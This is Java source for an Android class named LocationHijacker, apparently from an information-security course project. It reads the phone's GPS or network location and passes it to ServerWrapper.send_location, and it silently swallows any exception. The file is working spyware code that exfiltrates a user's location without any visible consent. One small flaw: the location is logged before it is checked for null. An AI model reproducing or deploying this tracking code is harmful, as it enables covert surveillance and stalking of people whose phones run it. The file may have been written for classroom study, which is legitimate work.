package com.seginfo.tp.seginfotp;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;


public class LocationHijacker
{
    Context _context;

    // La minima distancia para actualizar la ubicacion
    private static final long   MIN_DISTANCE_CHANGE_FOR_UPDATES = 0;                                // meters
    // El minimo tiempo entre actualizaciones en milisegundos
    private static final long   MIN_TIME_BW_UPDATES             = 1000 * 30 * 1;                    // Default: 30 seg

    protected LocationManager   _locationManager;

    boolean                     _isGPSEnabled                   = false;
    boolean                     _isNetworkEnabled               = false;
    boolean                     _canGetLocation                 = false;
    public Location             _location;
    double                      _latitude;
    double                      _longitude;

    public LocationHijacker(Context context){
        _context = context;
    }

    public void sendToServer() {
        try {

            LocationListener locationListener = new LocationListener() {
                public void onLocationChanged(Location location) {}

                public void onStatusChanged(String provider, int status, Bundle extras) {}

                public void onProviderEnabled(String provider) {}

                public void onProviderDisabled(String provider) {}
            };

            _locationManager = (LocationManager) _context.getSystemService(Context.LOCATION_SERVICE);
            _isGPSEnabled = _locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            _isNetworkEnabled = _locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            if (!_isGPSEnabled && !_isNetworkEnabled) {
                Log.i("LocationHijacker", "No network provider is enabled");
                // no network provider is enabled
            }
            else {
                this._canGetLocation = true;
                // Si GPS esta habilitado utiliza la ubicacion de el.
                if (_isGPSEnabled) {
                    Log.i("LocationHijacker", "GPS Enabled");
                    if (_location == null) {
                        _locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
                        Log.i("GPS Enabled", "GPS Enabled");
                        if (_locationManager != null) {
                            _location = _locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            if (_location != null) {
                                _latitude = _location.getLatitude();
                                _longitude = _location.getLongitude();
                                ServerWrapper.send_location(_location);
                            }
                        }
                    }
                }else {
                    if (_isNetworkEnabled) {
                        Log.i("LocationHijacker", "Network Enabled");
                        _locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
                        Log.i("LocationHijacker", "Network");
                        if (_locationManager != null) {
                            _location = _locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

                            Log.i("LocationHijacker", _location.toString());

                            if (_location != null) {
                                _latitude = _location.getLatitude();
                                _longitude = _location.getLongitude();
                                ServerWrapper.send_location(_location);
                            }
                        }
                    }
                }

            }
        }
        catch (Exception e) {
            // do nothing
        }
    }
}